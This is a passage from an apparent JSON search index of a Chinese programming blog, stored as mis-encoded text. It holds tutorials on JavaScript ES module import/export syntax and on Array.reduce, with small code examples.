\u0026#39;, result); 15 }); 16} è¶…çº§ç®€å•å§\nå…³é”®å°±æ˜¯ä¸Šé¢çš„é“¾å¼è°ƒç”¨\nsplit ç”¨æ¥åˆ†å‰²æ¯ä¸€è¡Œ filter ç”¨æ¥å»æ‰ç©ºè¡Œ map ç”¨æ¥æŠŠæ¯ä¸€è¡Œéƒ½è½¬åŒ–æˆæ•´æ•° reduce ç”¨æ¥æ±‚å’Œ ","date":"2022-05-22","img":"","permalink":"https://rendoumi.com/posts/20220522-javascirpts_fs/","series":null,"tags":null,"title":"Javascriptçš„å®é™…åº”ç”¨-Fsæ¨¡å—"},{"categories":null,"content":"JavaScript Module æ˜¯ä»€ä¹ˆ ä¸€ä¸ª JavaScript module æ¨¡å—å‡†ç¡®çš„è¯´å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œå®ƒå…è®¸ä½ æŠŠä»£ç  export å¯¼å‡ºæ¥å¤ç”¨ï¼Œè¿™æ ·åˆ«çš„ JavaScript æ–‡ä»¶å¯ä»¥ import è¿™ä¸ªæ–‡ä»¶æŠŠå®ƒä½œä¸ºåº“æ–‡ä»¶æ¥ä½¿ç”¨äº†ã€‚\næ¨¡å—ä¸»è¦æ˜¯ç”¨åœ¨å·¥ç¨‹æ–‡ä»¶ä¸­ï¼Œç”¨æ¥æŠŠä»£ç å…±äº«ç»™å…¶ä»–æ–‡ä»¶ç”¨ï¼Œjavascipt çš„æ¨¡å—å¯ä»¥è¯´æ˜¯æ»¡å¤©é£ã€‚\nè¿™é‡Œå‘¢è®¨è®ºçš„æ˜¯å‰ç«¯çš„éƒ¨åˆ†ï¼Œå³æ˜¯è¿è¡Œåœ¨æµè§ˆå™¨ä¸­çš„ javascripts module éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯è¿è¡Œåœ¨åç«¯çš„ Node.js çš„éƒ¨åˆ†ï¼Œåç«¯ç°åœ¨å·²ç»å‘å‰ç«¯é æ‹¢äº†ã€‚\nES6æ ‡å‡†å‘å¸ƒåï¼Œmoduleæˆä¸ºæ ‡å‡†ï¼Œæ ‡å‡†ä½¿ç”¨æ˜¯ä»¥exportæŒ‡ä»¤å¯¼å‡ºæ¥å£ï¼Œä»¥importå¼•å…¥æ¨¡å—ï¼Œä½†æ˜¯åœ¨æˆ‘ä»¬ä¸€è´¯çš„nodeæ¨¡å—ä¸­ï¼Œæˆ‘ä»¬ä¾ç„¶é‡‡ç”¨çš„æ˜¯CommonJSè§„èŒƒï¼Œä½¿ç”¨requireå¼•å…¥æ¨¡å—ï¼Œä½¿ç”¨module.exportså¯¼å‡ºæ¥å£ã€‚è¿™ç‚¹ä¹Ÿç†è§£æ¸…æ¥šã€‚\næˆ‘ä»¬ä»é›¶æ¥ä¸€æ­¥æ­¥å¼€å§‹å§\nå¦‚ä½•æŠŠä¸€ä¸ª JavaScript æ–‡ä»¶è½¬æ¢ä¸º ES çš„ module 1: åˆ›å»ºä¸€ä¸ª project ç›®å½• è¿™ä¸ªç›®å½•ç”¨æ¥æ”¾ HTML å’Œ JavaScript æ–‡ä»¶\n2: å»ºç«‹ä½ çš„ code ä»£ç æ–‡ä»¶ åœ¨ project æ–‡ä»¶å¤¹ä¸­å»ºç«‹2ä¸ªæ–‡ä»¶:\nindex.html index.js 3: æ·»åŠ  JavaScript æ–‡ä»¶çš„å¼•ç”¨åˆ° HTML æ–‡ä»¶ä¸­ æ‰“å¼€index.html ç¼–è¾‘å®ƒï¼š\n1\u0026lt;!DOCTYPE html\u0026gt; 2\u0026lt;html\u0026gt; 3 \u0026lt;head\u0026gt; 4 \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; 5 \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; 6 \u0026lt;title\u0026gt;ES Module - zhang ranrui\u0026lt;/title\u0026gt; 7 \u0026lt;/head\u0026gt; 8 \u0026lt;body\u0026gt; 9 \u0026lt;h1\u0026gt;ES Module Tutorial\u0026lt;/h1\u0026gt; 10 11 \u0026lt;!-- Add the \u0026#34;index.js\u0026#34; JavaScript file to this HTML document --\u0026gt; 12 \u0026lt;script type=\u0026#34;module\u0026#34; src=\u0026#34;index.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 13 \u0026lt;/body\u0026gt; 14\u0026lt;/html\u0026gt; ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬å¼•ç”¨äº† index.js , å¹¶å®šä¹‰å®ƒ type=\u0026ldquo;module\u0026rdquo;ï¼Œè¿™æ˜¾å¼æŒ‡æ˜äº† index.js æ˜¯ä¸€ä¸ª ES çš„moduleã€‚\né‚£ä¹ˆï¼Œå¦‚æœæœ‰äº†ä¸€ä¸ª ES çš„ moduleï¼Œå¦‚ä½•ä½¿ç”¨å®ƒå‘¢ï¼Œä¹Ÿä¸¾ä¸ªä¾‹å­ï¼š\nå¦‚ä½•ä½¿ç”¨ä¸€ä¸ª ES çš„ Module 1: å»ºç«‹ä¸€ä¸ª project ç›®å½• åŒæ ·æ˜¯æ”¾ html å’Œ module æ–‡ä»¶çš„ã€‚\n2: å»ºç«‹ code æ–‡ä»¶ åœ¨ project æ–‡ä»¶å¤¹ä¸‹å»ºç«‹å¦‚ä¸‹æ–‡ä»¶:\nindex.html module-1.js module-2.js 3: å¢åŠ  modules æ–‡ä»¶çš„å¼•ç”¨åˆ° HTML æ–‡ä»¶ ç¼–è¾‘ index.html æ–‡ä»¶ï¼Œå¢åŠ å¯¹ module çš„å¼•ç”¨:\n1\u0026lt;!DOCTYPE html\u0026gt; 2\u0026lt;html\u0026gt; 3 \u0026lt;head\u0026gt; 4 \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; 5 \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; 6 \u0026lt;title\u0026gt;ES Module - zhang ranrui\u0026lt;/title\u0026gt; 7 \u0026lt;/head\u0026gt; 8 \u0026lt;body\u0026gt; 9 \u0026lt;h1\u0026gt;ES Module Tutorial\u0026lt;/h1\u0026gt; 10 \u0026lt;h2\u0026gt;Check the console\u0026lt;/h2\u0026gt; 11 12 \u0026lt;script type=\u0026#34;module\u0026#34; src=\u0026#34;module-1.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 13 \u0026lt;script type=\u0026#34;module\u0026#34; src=\u0026#34;module-2.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 14 \u0026lt;/body\u0026gt; 15\u0026lt;/html\u0026gt; 4: æµè§ˆä½ çš„ index.html æ³¨æ„ï¼Œè¿™é‡Œåªèƒ½åœ¨ localhost çš„æœåŠ¡å™¨ä¸Šæµè§ˆï¼Œç›´æ¥æµè§ˆæœ¬åœ°æ–‡ä»¶ä¼šæŠ¥ cors çš„é”™ã€‚\næ€ä¹ˆ Export å¯¼å‡ºä¸€ä¸ª Module ä¸­çš„ä»£ç  æœ‰ä¸¤ç§ä½¿ç”¨æ–¹æ³•\nåœ¨ä»£ç å‰ä½¿ç”¨ export å…³é”®å­— ä½¿ç”¨ export å£°æ˜è¯­å¥ ä¸€ã€åœ¨ä»£ç å‰ä½¿ç”¨ export å…³é”®å­— æ³¨æ„ï¼šæ˜¯åœ¨æ­£å¼ä»£ç ä¹‹å‰\n1// module-1.js 2 3// Export the \u0026#34;bestClub\u0026#34; variable: 4export const bestClub = \u0026#34;Your Club\u0026#34;; å¦å¤–ä¸€ä¸ªä¾‹å­ï¼š\n1// Export the \u0026#34;multiply\u0026#34; function: 2export function multiply(x, y) { 3 return x * y; 4} äºŒã€ä½¿ç”¨ export å£°æ˜è¯­å¥ å¦ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ export å£°æ˜è¯­å¥ï¼Œè¿™ç§æ–¹å¼ç”¨ {} åŒ…è£¹ è¦å¯¼å‡ºçš„å˜é‡ï¼Œä¸­é—´çš„å˜é‡åç”¨é€—å·æ¥éš”å¼€ã€‚\n1// Create a variable named \u0026#34;bestClub\u0026#34;: 2const bestClub = \u0026#34;Your Club\u0026#34;; 3 4// Create a function named \u0026#34;multiply\u0026#34;: 5function multiply(x, y) { 6 return x * y; 7} 8 9// Create an array named \u0026#34;fruits\u0026#34;: 10const fruits = [\u0026#34;Mango\u0026#34;, \u0026#34;Apple\u0026#34;, \u0026#34;Orange\u0026#34;, \u0026#34;Lemon\u0026#34;]; 11 12// Export the three statements above: 13export { bestClub, multiply, fruits }; å¯¼å‡ºæœ‰äº†ï¼Œæ€æ ·å¯¼å…¥åˆ«çš„æ¨¡å— Exported çš„ä»£ç å‘¢ï¼Ÿ æ¥ä¸Šçš„ä¾‹å­ï¼Œåªå¯¼å…¥ä¸€ä¸ªå˜é‡ï¼š\n1// module-2.js 2 3import { bestClub } from \u0026#34;./module-1.js\u0026#34;; å¯¼å…¥æ‰€æœ‰å˜é‡\n1// Import three items from the module-1.js file: 2import { bestClub, multiply, fruits } from \u0026#34;./module-1.js\u0026#34;; æ³¨æ„./æ˜¯è¡¨ç¤ºå½“å‰è·¯å¾„ï¼Œå¦‚æœè·¯å¾„ä¸å¯¹ï¼Œæœ‰å¯èƒ½éœ€è¦å…¨è·¯å¾„å¯¼å…¥\n1// Import three items from the module-1.js file: 2import { bestClub, multiply, fruits } from \u0026#34;/codesweetly/blog/notes/modular-javascript/es-modules/module-1.js\u0026#34;; æ³¨æ„åœ¨åç«¯ Node.js å’Œ module bundlers ä¸­ï¼Œæ˜¯å…è®¸ä½ ä¸å†™æ–‡ä»¶ååç¼€çš„ï¼Œæ¯”å¦‚ä¸‹é¢\n1// Import three items from the module-1.js file: 2import { bestClub, multiply, fruits } from \u0026#34;module-1\u0026#34;; ä½†æ˜¯ï¼Œåœ¨ ES modules ä¸­ï¼Œä¸å…è®¸çœç•¥æ–‡ä»¶åç¼€ã€‚\nå¦‚ä½•ä½¿ç”¨ä»åˆ«çš„æ¨¡å— Imported å¯¼å…¥çš„ä»£ç  1// module-2.js 2 3import { bestClub } from \u0026#34;./module-1.js\u0026#34;; 4 5const myBestClub = bestClub + \u0026#34; \u0026#34; + \u0026#34;is my best club.\u0026#34;; 6 7console.log(myBestClub); æ³¨æ„:\nimport å…³é”®å­—åªèƒ½å‡ºç°åœ¨ modules æ–‡ä»¶ä¸­ï¼Œä¸èƒ½å‡ºç°åœ¨é€šå¸¸çš„ JavaScript ç¨‹åºæ–‡ä»¶ä¸­ã€‚ ä¸€ä¸ªè¢« imported å¯¼å…¥çš„æ¨¡å—åªèƒ½ä½œç”¨äºæœ¬æ–‡ä»¶ä¸­ï¼Œè€Œä¸æ˜¯å…¨å±€å¯ç”¨ã€‚ä½ åªèƒ½åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ä½¿ç”¨ã€‚ JavaScript ä¼šè‡ªåŠ¨æå‡ import è¯­å¥çš„ä½œç”¨åŸŸï¼Œæ‰€ä»¥ä½ å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹ä½¿ç”¨ import ï¼Œç”šè‡³åœ¨ä½¿ç”¨å…¶ä¸­ä»£ç ä¹‹åã€‚ Imported å¯¼å…¥çš„æ¨¡å—ç¼ºçœå¤„äº strict ä¸¥æ ¼æ¨¡å¼ä¸‹ã€‚ å¦‚ä½•å°† Exports å’Œ Imports å¯¼å…¥å¯¼å‡ºçš„æ¨¡å—é‡å‘½å ç”¨ as å³å¯ï¼š\n1// module-1.js 2 3// Create a variable named \u0026#34;bestClub\u0026#34;: 4const bestClub = \u0026#34;Your Club\u0026#34;; 5 6// Export the bestClub variable as \u0026#34;favoriteTeam\u0026#34;: 7export { bestClub as favoriteTeam }; æ¥ä¸‹æ¥ä½¿ç”¨å°±ä¸èƒ½æ˜¯ bestclub , è€Œæ˜¯ favoriteTeam äº†ï¼š\n1// module-2.js 2 3import { favoriteTeam } from \u0026#34;./module-1.js\u0026#34;; 4 5const myBestClub = favoriteTeam + \u0026#34; \u0026#34; + \u0026#34;is my best club.\u0026#34;; 6 7console.log(myBestClub); åŒæ ·å¯ä»¥åœ¨ import çš„æ—¶å€™ä½¿ç”¨ as\n1// module-1.js 2// Create a variable named \u0026#34;bestClub\u0026#34;: 3const bestClub = \u0026#34;Your Club\u0026#34;; 4// Export the bestClub variable: 5export { bestClub }; 6 7// module-2.js 8import { bestClub as favoriteTeam } from \u0026#34;./module-1.js\u0026#34;; 9const myBestClub = favoriteTeam + \u0026#34; \u0026#34; + \u0026#34;is my best club.\u0026#34;; 10console.log(myBestClub); å¦‚ä½•åœ¨ ES Module ä¸­é‡å‘½åå¤šä¸ª Exports å¯¼å‡º å¾ˆç®€å•ï¼Œç”¨asåŠ ä¸Šé€—å·åˆ†å‰²ç¬¦å·\n1// module-1.js 2 3const bestClub = \u0026#34;Your Club\u0026#34;; 4const fruits = [\u0026#34;Grape\u0026#34;, \u0026#34;Apple\u0026#34;, \u0026#34;Pineapple\u0026#34;, \u0026#34;Lemon\u0026#34;]; 5 6function multiply(x, y) { 7 return x * y; 8} 9 10// Export the three statements above: 11export { 12 bestClub as favoriteTeam, 13 fruits as crops, 14 multiply as product 15}; 16// module-2.js 17 18import { favoriteTeam, crops, product } from \u0026#34;./module-1.js\u0026#34;; 19 20const bestClub = `I bought ${product(2, 11)} ${crops[2]}s at ${favoriteTeam}.`; 21 22console.log(bestClub); å¦‚ä½•åœ¨ ES Module ä¸­é‡å‘½åå¤šä¸ª Import å¯¼å…¥ è·Ÿä¸Šé¢ä¸€æ ·ï¼š\n1// module-1.js 2 3const bestClub = \u0026#34;Your Club\u0026#34;; 4const fruits = [\u0026#34;Grape\u0026#34;, \u0026#34;Apple\u0026#34;, \u0026#34;Pineapple\u0026#34;, \u0026#34;Lemon\u0026#34;]; 5function multiply(x, y) { 6 return x * y; 7} 8 9// Export the three statements above: 10export { bestClub, fruits, multiply }; 11// module-2.js 12 13import { 14 bestClub as favoriteTeam, 15 fruits as crops, 16 multiply as product 17} from \u0026#34;./module-1.js\u0026#34;; 18 19const bestClub = `I bought ${product(2, 11)} ${crops[2]}s at ${favoriteTeam}.`; 20 21console.log(bestClub); å¦‚ä½•åœ¨ ES Module ä¸€å¥è¯ import å¯¼å…¥æ‰€æœ‰å¯¼å‡ºå˜é‡ ç”¨*å·ï¼š\n1// Import all exportable features from the \u0026#34;countries.js\u0026#34; module: 2import * as allCountries from \u0026#34;./countries.js\u0026#34;; ä¾‹å­å¦‚ä¸‹ï¼š\n1// module-1.js 2 3const bestClub = \u0026#34;Your Club\u0026#34;; 4const fruits = [\u0026#34;Grape\u0026#34;, \u0026#34;Apple\u0026#34;, \u0026#34;Pineapple\u0026#34;, \u0026#34;Lemon\u0026#34;]; 5function multiply(x, y) { 6 return x * y; 7} 8 9// Export the three statements above: 10export { bestClub, fruits, multiply }; 11// module-2.js 12 13import * as firstModule from \u0026#34;./module-1.js\u0026#34;; 14 15const bestClub = `I bought ${firstModule.multiply(2, 11)} ${firstModule.fruits[2]}s at ${firstModule.bestClub}.`; 16 17console.log(bestClub); å¦‚ä½•åœ¨ ES Module ä¸­ Export æŒ‡å®š default ç¼ºçœå¯¼å‡º å¦‚æœå¯¼å‡ºçš„æ—¶å€™æŒ‡å®š default ï¼Œå°±æ˜¯ç¼ºçœå¯¼å‡ºã€‚Default export\n1// module-1.js 2 3const bestClub = \u0026#34;Your Club\u0026#34;; 4 5// Export the bestClub variable as a default export: 6export default bestClub; æ³¨æ„ï¼šdefault ä¸¤è¾¹æ²¡æœ‰èŠ±æ‹¬å·ï¼Œå› ä¸º default åªèƒ½æœ‰ä¸€ä¸ªï¼Œè€Œä¸”ç¼ºçœå¯¼å‡ºä¸èƒ½æ˜¯ var , let æˆ–è€… const\nå¦‚ä½• import å¯¼å…¥ç¼ºçœå¯¼å‡º ä¾ç„¶ä¸¤ç§æ–¹æ³•ï¼š\nä½¿ç”¨ default as çš„è¯­æ³• ç›´æ¥å‘½åç¼ºçœå¯¼å‡º ä¸€ã€ä½¿ç”¨ default as è¯­æ³• 1import { default as newName } from \u0026#34;./module-relative-path.js\u0026#34;; ä¾‹å­ï¼š\n1// module-1.js 2 3// Export the string value as a default export: 4export default \u0026#34;Your Club\u0026#34;; 5// module-2.js 6 7import { default as favoriteTeam } from \u0026#34;./module-1.js\u0026#34;; 8 9const bestClub = favoriteTeam + \u0026#34; \u0026#34; + \u0026#34;is my best club.\u0026#34;; 10 11console.log(bestClub); äºŒã€ç›´æ¥å‘½åç¼ºçœå¯¼å‡º è¿™ç§æ–¹å¼ï¼Œå¯ä»¥çœ‹ä½œæ˜¯ç¬¬ä¸€ç§å»æ‰èŠ±æ‹¬å·ï¼Œå»æ‰ default as åçš„ç®€ç•¥å†™æ³•ï¼š\n1import newName from \u0026#34;./module-relative-path.js\u0026#34;; ä¾‹å­ï¼š\n1// module-1.js 2 3// Export the string value as a default export: 4export default \u0026#34;Your Club\u0026#34;; 5// module-2.js 6 7import favoriteTeam from \u0026#34;./module-1.js\u0026#34;; 8 9const bestClub = favoriteTeam + \u0026#34; \u0026#34; + \u0026#34;is my best club.\u0026#34;; 10 11console.log(bestClub); overï¼Œè¿™ä¹ˆå¤šï¼Œå¤§å®¶åº”è¯¥ä¼šäº†å§ã€‚å›å¤´ä¼šå¦å¼€ä¸€ç¯‡è¯´è¯´å¦‚ä½•æŠŠæ¨¡å—éƒ½å‹åˆ°ä¸€èµ·ï¼Œé‚£å°±æ˜¯ webpack çš„åŠŸèƒ½äº†ã€‚\n","date":"2022-05-21","img":"","permalink":"https://rendoumi.com/posts/20220521-javascripts_module/","series":null,"tags":null,"title":"Javascriptsä¸­çš„module"},{"categories":null,"content":"ç ”ç©¶ä¸€ä¸‹ javascripts çš„ reduce ï¼Œreduce æ˜¯æ—¢èƒ½æ”¹å˜ array çš„ sizeï¼Œåˆèƒ½æ”¹å˜æ•°å€¼çš„å‡½æ•°ï¼Œfilter æ˜¯åªèƒ½æ”¹å˜sizeï¼Œä¸èƒ½æ”¹å˜æ•°å€¼ï¼›è€Œ map æ˜¯ä¸èƒ½æ”¹å˜ sizeï¼Œå¯ä»¥æ”¹å˜æ•°å€¼ã€‚å¾ˆæ‹—å£å§ï¼Œä¸‰ä¸ªå…„å¼Ÿã€‚\nç®€å•ä»‹ç»ä¸€ä¸‹ reduceã€‚\nå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæ•°ç»„:\n1[1, 2, 3, 4] æˆ‘ä»¬è¦å¯¹æ•´ä¸ªæ•°ç»„æ±‚å’Œ.\nreduce å®é™…æ˜¯æŒ‰ç…§ä¸‹åˆ—çš„ç®—å¼æ¥è¿›è¡Œæ±‚å’Œçš„:\n((((1) + 2) + 3) + 4)\né‚£å®é™… reduce å‡½æ•°æ‰§è¡Œä¸­ï¼Œä½ å¯ä»¥æŒ‰ä½ éœ€æ±‚æ¥è‡ªå®šä¹‰ä½ è‡ªå·±çš„ + æ“ä½œç¬¦ã€‚æ•°ç»„çš„å€¼ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–çš„ä»»æ„ä¸œè¥¿ã€‚å¬èµ·æ¥æœ‰ç‚¹æ„æ€å§ï¼Ÿ\n1ã€ Reduce æ˜¯å¹²å˜›çš„ åœ¨ä¸€ä¸ªå‡½æ•°å¼ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œreduce å…¶å®æœ‰å¾ˆå¤šåˆ«çš„åç§°ï¼Œæ¯”å¦‚ foldï¼ˆå¯¹æŠ˜ï¼‰, accumulateï¼ˆç´¯åŠ å™¨ï¼‰, aggregateï¼ˆèšåˆå™¨ï¼‰, compressï¼ˆå‹ç¼©ï¼‰ ç”šè‡³å« injectï¼ˆæ³¨å…¥ï¼‰ã€‚\n2ã€ Reduce çš„å‚æ•° å¸¸ç”¨ç”¨æ³•å¦‚ä¸‹ï¼š\n1let myArray = [/* é¦–å…ˆå®šä¹‰ä¸€ä¸ªæ•°ç»„ */]; 2let callbackfn = /* å†å®šä¹‰ä¸€ä¸ªå‡½æ•° */ ; 3let initialvalue = /* ä»»æ„ä¸€ä¸ªåˆå§‹åŒ–çš„å€¼ */ ; 4 5myArray.reduce(callbackfn) 6myArray.reduce(callbackfn, initialValue) reduce çš„å‚æ•°å¦‚ä¸‹:\ncallbackfn: å¿…é¡»æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¼šåœ¨æ•´ä¸ªæ•°ç»„ä¸­åå¤è°ƒç”¨ï¼Œreduce è°ƒç”¨ callbackfn çš„æ—¶å€™æœ‰4ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬å®šä¹‰å®ƒä»¬æ˜¯ previousValue, currentElement, index å’Œ array ï¼Œçœ‹èµ·æ¥åƒä¸‹é¢ä¸€æ ·:\n1callbackfn(previousValue, currentElement, index, array) è§£é‡Šä¸€ä¸‹:\npreviousValue: è¿™ä¸ªå‚æ•°å°±æ˜¯ä¸€ä¸ªç´¯åŠ å™¨ã€‚ currentElement: æ•°ç»„ä¸­å¤„ç†çš„å½“å‰å…ƒç´ ã€‚ index: å½“å‰å…ƒç´ çš„ç´¢å¼•å€¼ã€‚ array: myArrayè°ƒç”¨çš„æ•°ç»„. Return valueï¼ˆè¿”å›å€¼ï¼‰: æœ€åä¸€æ¬¡è°ƒç”¨ callbackfn çš„æ—¶å€™ï¼Œè¿”å›å€¼å°±æ˜¯æ•´ä¸ª reduce è¿‡ç¨‹çš„è¿”å›å€¼ã€‚å¦‚æœä¸æ˜¯æœ€åä¸€æ¬¡è°ƒç”¨ï¼Œå®ƒè¿”å›çš„å€¼ä¼šè¢«ä¸‹æ¬¡çš„ callbackFn çš„ previousvalue å‚æ•°æ¥æ”¶ã€‚\næˆ‘ä»¬å¿…é¡»æ³¨æ„ï¼Œå‡½æ•°å°±æ˜¯å‡½æ•°ï¼Œå‡½æ•°è¿‡ç¨‹ä¸­å¤„ç†çš„å˜é‡è¦ä¹ˆæ˜¯å¤–å›´çš„ scope å¸¦è¿›æ¥çš„ï¼Œè¦ä¹ˆæ˜¯å‡½æ•°ä½“å†…è‡ªå®šä¹‰çš„ï¼Œæ‰€ä»¥åé¢ä¸¤ä¸ª index å’Œ array ä¹Ÿæ˜¯å¿…é¡»å­˜åœ¨çš„ï¼Œåªä¸è¿‡æ˜¯ reduce å‡½æ•°æ›¿ä½ è‡ªåŠ¨å¤„ç†äº†ã€‚\n3ã€ ç”¨ç”»å›¾æ¥ç†è§£ Reduce çœ‹ä¸Šé¢çš„å›¾ï¼Œreduce å’Œ reductRight å‡½æ•°çš„åŒºåˆ«å°±æ˜¯æ–¹å‘ï¼Œä¸€ä¸ªæ˜¯ä»å·¦åˆ°å³ï¼Œä¸€ä¸ªæ˜¯ä»å³åˆ°å·¦ã€‚\nå…³æ³¨ç‚¹å¦‚ä¸‹:\nacc ç›¸å½“äº previousValue ï¼Œç´¯åŠ å™¨. curVal ç›¸å½“äºcurrentElementï¼Œå½“å‰å¤„ç†å…ƒç´ . æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ å‘ä¸‹è¾“å‡ºåˆ°åœˆ r å°±æ˜¯curValè¾“å‡ºåˆ°***r***çš„å…·ä½“è¡¨ç°. åŒ…å«æ•°ç»„å…ƒç´ çš„é•¿æ–¹å½¢è¾“å‡ºåˆ°ä¸‹ä¸€ä¸ª r å°±æ˜¯ acc è¾“å‡ºåˆ°***r***çš„å…·ä½“è¡¨ç°. åˆå§‹åŒ–å€¼åœ¨æ•°ç»„å¤–å•ç‹¬è¡¨ç¤ºï¼Œå®ƒæ˜¯ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„ acc è¾“å‡ºåˆ° r ä¸­çš„. 3ã€ ç”¨æµç¨‹å›¾æ¥ç†è§£ Reduce ä¸‹é¢ç”¨20è¡Œçš„ä¼ªä»£ç æ¥è¯¦ç»†è§£é‡Šæ•´ä¸ª reduce çš„è¿‡ç¨‹ï¼Œé¦–å…ˆè¿›å…¥ reduce å‡½æ•°ï¼š\nIf initialValue is present, å¦‚æœåˆå§‹åŒ–å˜é‡ä¸ä¸ºç©º If myArray has no elements, æ¥ç€åˆ¤æ–­å¦‚æœæ•°ç»„ä¸ºç©º Return initialValue. é‚£ä¹ˆç›´æ¥åˆå§‹åŒ–å˜é‡ä½œä¸º reduce çš„ç»“æœè¿”å› else åˆå§‹åŒ–å˜é‡ä¸ºç©ºä½†æ•°ç»„ä¸ä¸ºç©º Let accumulator be initialValue. æŠŠåˆå§‹å˜é‡èµ‹ç»™ç´¯åŠ å™¨ If the method is reduce, å¦‚æœæ–¹æ³•æ˜¯ reduce Let startIndex be the index of the leftmost element of myArray. æŠŠæ•°ç»„æœ€å·¦è¾¹çš„å…ƒç´ çš„indexå€¼èµ‹äºˆ startIndex else å¦‚æœåˆå§‹åŒ–å˜é‡ä¸ºç©º If myArray has no elements, å¦‚æœæ•°ç»„æ²¡æœ‰å…ƒç´  Throw TypeError. åˆå§‹åŒ–å˜é‡ä¸ºç©ºï¼Œæ•°ç»„ä¹Ÿä¸ºç©ºï¼Œç›´æ¥æŠ›ç±»å‹é”™è¯¯ Else if myArray has just only one element, å¦‚æœæ•°ç»„åªæœ‰ä¸€ä¸ªå…ƒç´  Return that element. é‚£ä¹ˆç›´æ¥å°†æ•°ç»„ä¸­å”¯ä¸€ä¸€ä¸ªå…ƒç´ ä½œä¸º reduce ç»“æœè¿”å› Else If the method is reduce,å¦‚æœæ–¹æ³•æ˜¯ reduce Let accumulator be the leftmost element of myArray. æŠŠæ•°ç»„æœ€å·¦è¾¹çš„ç¬¬ä¸€ä¸ªå…ƒç´ èµ‹ç»™ç´¯åŠ å™¨ If the method is reduce, å¦‚æœæ–¹æ³•æ˜¯reduce In left to right order, for each element of myArray such that its index i â‰¥ startingIndex, æŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºï¼Œéå†æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ ï¼Œæ¥ä¸ªå¤§å¾ªç¯ Set accumulator to callbackfn(accumulator, myArray[i], i, myArray). æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œéƒ½é€ä¸ªè®¾ç½®åˆ°callbackfnå‡½æ•°ä¸­å¹¶è¿è¡Œ Return accumulator. ç´¯åŠ å™¨çš„å€¼ä½œä¸º reduce ç»“æœè¿”å› ä»”ç»†ç†è§£ï¼Œæå®Œäº†å§ã€‚\nç»™ä¸ªå®é™…ä¾‹å­ï¼Œä¸€ç¾¤å­¦ç”Ÿï¼Œæœ‰ç”·æœ‰å¥³ï¼Œå…ˆé€‰å‡ºå¥³å­¦ç”Ÿï¼Œç„¶åè®¡ç®—å‡ºå¥¹ä»¬æ¯ä¸ªäººçš„å¹³å‡æˆç»©ï¼Œæœ€åæŠŠå¥¹ä»¬æ‰“å°å‡ºæ¥ï¼š\n1const students = [ 2 { 3 name: \u0026#34;Anna\u0026#34;, 4 sex: \u0026#34;f\u0026#34;, 5 grades: [4.5, 3.5, 4] 6 }, 7 8 { 9 name: \u0026#34;Dennis\u0026#34;, 10 sex: \u0026#34;m\u0026#34;, 11 country: \u0026#34;Germany\u0026#34;, 12 grades: [5, 1.5, 4] 13 }, 14 15 { 16 name: \u0026#34;Martha\u0026#34;, 17 sex: \u0026#34;f\u0026#34;, 18 grades: [5, 4, 2.5, 3] 19 }, 20 21 { 22 name: \u0026#34;Brock\u0026#34;, 23 sex: \u0026#34;m\u0026#34;, 24 grades: [4, 3, 2] 25 } 26]; 27 28 29//TODO: Compute and Return female students results using functional programming. 30 31function studentResult(students){ 32 return students.filter(x =\u0026gt; x.sex==\u0026#34;f\u0026#34;).reduce((init,cur)=\u0026gt;{ 33 cur[\u0026#39;grades\u0026#39;]=cur.grades.reduce((acc,cur) =\u0026gt; acc+cur,0)/cur.grades.length; 34 return init.concat(cur); 35 },[]); 36} 37 38console.log(studentResult(students)); 39//[ { name: \u0026#39;Anna\u0026#39;, sex: \u0026#39;f\u0026#39;, grades: 4 }, { name: \u0026#39;Martha\u0026#39;, sex: \u0026#39;f\u0026#39;, grades: 3.625 } ] æ³¨æ„ä¸€ç‚¹ï¼Œreduce å¯ä»¥åŠ¨ sizeï¼Œä¹Ÿå¯ä»¥åŠ¨å€¼ï¼Œä¸Šé¢å®é™…æ”¹å˜äº† students æ•°ç»„å…ƒç´ çš„å€¼äº†ï¼Œä¸å¤ªå¥½ã€‚åº”è¯¥èµ‹ä¸€ä¸ªæ–°å€¼ concat æˆ–è€… push è¿›æ–°æ•°ç»„ã€‚\nä¸‹é¢çš„æ–¹æ³•å°±æ²¡æœ‰åŠ¨åŸæ•°ç»„çš„æ•°æ®ï¼š\n1function studentResult(students){ 2 return students.filter(x =\u0026gt; x.sex==\u0026#34;f\u0026#34;).reduce((init,cur)=\u0026gt;{ 3 let newarr = {}; 4 newarr[\u0026#39;name\u0026#39;]=cur.name; 5 newarr[\u0026#39;sex\u0026#39;]=cur.sex; 6 newarr[\u0026#39;grades\u0026#39;]=cur.grades.reduce((acc,cur) =\u0026gt; acc+cur,0)/cur.grades.length; 7 init.push(newarr); 8 return init; 9 },[]); 10} ","date":"2022-05-20","img":"","permalink":"https://rendoumi.com/posts/20220520-javascripts_reduce/","series":null,"tags":null,"title":"Javascriptsä¹‹æ•°ç»„çš„reduce"},{"categories":null,"content":"é¢è¯•çš„æ—¶å€™è¢«é—®åˆ°ï¼šå¦‚ä½•æ‰èƒ½è®© docker 